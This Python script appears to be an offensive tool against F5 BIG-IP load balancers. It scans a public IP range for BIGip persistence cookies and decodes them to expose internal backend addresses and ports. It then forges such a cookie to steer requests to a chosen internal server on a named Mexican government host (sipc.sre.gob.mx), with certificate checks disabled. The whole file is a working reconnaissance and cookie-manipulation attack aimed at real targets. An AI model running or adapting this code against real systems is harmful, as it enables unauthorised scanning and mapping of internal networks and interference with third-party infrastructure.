# -*- coding: utf-8 -*-
import ipaddress
import warnings
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from pprint import pprint

import requests
from requests.cookies import RequestsCookieJar


NETWORKS = [
    # ipaddress.ip_network('200.33.160.0/24'),
    # ipaddress.ip_network('200.33.161.0/24'),
    # ipaddress.ip_network('200.33.162.0/24'),
    ipaddress.ip_network('200.33.163.0/24'),
    # ipaddress.ip_network('200.33.164.0/24'),
]


def decode_cookie_val(val):
    ip, port, suffix = val.split('.')
    ip = hex(int(ip))[2:]
    port = hex(int(port))[2:]
    if len(ip) < 8: ip = '0' + ip
    if len(port) < 4: port = '0' + port

    ip = '%d.%d.%d.%d' % (int(ip[6:8], 16), int(ip[4:6], 16), int(ip[2:4], 16), int(ip[0:2], 16))
    port = int('%s%s' % (port[2:4], port[0:2]), 16)
    
    return (ip, port)


def encode_cookie_val(ip: ipaddress.IPv4Address, port: int) -> str:
    """
    Codifica una IP y puerto a formato Cookie de BIGIP F5
    :param ip: Instancia de ipaddress.IPv4Address
    :param port: Int con el puerto
    """
    # for index, byte in enumerate(ip.exploded.split('.')):
        # print( index, byte, int(byte) * (256 ** index if index > 0 else 0) )
    ipenc = sum([(int(byte) * (256 ** (index if index > 0 else 0))) for index, byte in enumerate(ip.exploded.split('.'))])
    
    portenc = hex(port)[2:]
    if len(portenc) < 4:
        portenc = '{}00'.format(portenc)
    portenc = int(portenc, 16)

    return '{}.{}.0000'.format(ipenc, portenc)


def make_request(ip, locker):
    for proto in ['http', 'https']:
        url = '{}://{}/'.format(proto, ip)
        try:
            resp = requests.get(
                url=url,
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate',
                    'User-Agent': 'Mozilla/5.0',
                },
                allow_redirects=False,
                verify=False,
                timeout=3,
            )
        except (requests.Timeout, requests.ConnectionError, requests.HTTPError, requests.TooManyRedirects) as error:
            continue
        else:
            for cookie in resp.cookies:
                if cookie.name.upper().find('BIGIP') != -1:
                    with locker:
                        print(url)
                        if re.match('[0-9]{7,11}\.[0-9]{4,6}\.0000', cookie.value):
                            print(cookie.name, cookie.value, '%s:%d' % decode_cookie_val(cookie.value))
                        else:
                            print('[WARN] Cookie value not match regexp:', cookie.value)
                        # print('=' * 30, '\n')
                        print()


def main():
    with ThreadPoolExecutor(max_workers=20) as executor:
        locker = threading.Lock()
        for network in NETWORKS:
            for ip in network:
                    if ip.packed[-1] not in [0, 255]:
                        executor.submit(make_request, ip, locker)


def test_redirect_bigip_ows(url: str, host: str, ows_ip: ipaddress.IPv4Address, ows_port: int):
    cookiejar = RequestsCookieJar()
    cookiejar.set('BIGipServerGrupo_5', encode_cookie_val(ows_ip, ows_port))
    print(cookiejar)
    resp = requests.get(
        url=url,
        headers={
            'Host': host,
            'User-Agent': 'Mozilla 5.0',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache, max-age=0',
        },
        cookies=cookiejar,
        verify=False,
        allow_redirects=False,
    )
    pprint(resp.status_code)
    pprint(dict(resp.headers))
    with open('tmp.html', 'w') as fd:
        fd.write(resp.text)

    pprint('=' * 50)
    pprint(resp.request.url)
    pprint(dict(resp.request.headers))


if __name__ == '__main__':
    warnings.simplefilter("ignore")
    
    # ip = ipaddress.IPv4Address('10.1.1.100')
    # port = 80
    # print(ip.exploded, port)
    # ip_port_enc = encode_cookie_val(ip, port)
    # print(ip_port_enc)
    # print(decode_cookie_val(ip_port_enc))
    # ----------------------------------------------------------
    test_redirect_bigip_ows(
        'http://200.33.163.53/',
        'sipc.sre.gob.mx',
        # 'sirme.sre.gob.mx',
        ipaddress.IPv4Address('10.100.0.8'),
        80,
    )
    # ----------------------------------------------------------

    # try:
        # exit(main())
    # except KeyboardInterrupt:
        # exit(0)
